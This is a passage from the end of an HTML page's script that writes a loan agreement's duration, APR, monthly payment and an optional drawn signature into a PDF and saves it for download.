            doc.text(`Duration: ${document.getElementById('loanDurationDisplay').textContent}`, 20, 120);
            doc.text(`APR: ${document.getElementById('aprDisplay').textContent}`, 20, 130);
            doc.text(`Monthly Payment: ${document.getElementById('monthlyPaymentDisplay').textContent}`, 20, 140);
            
            // Add signature if exists
            if (signaturePad && !signaturePad.isEmpty()) {
                const signatureData = signaturePad.toDataURL();
                doc.addImage(signatureData, 'PNG', 20, 160, 100, 50);
            }
            
            // Download the PDF
            doc.save(`loan-agreement-${document.getElementById('agreementNumber').textContent}.pdf`);
        }
    </script>
</body>
</html>
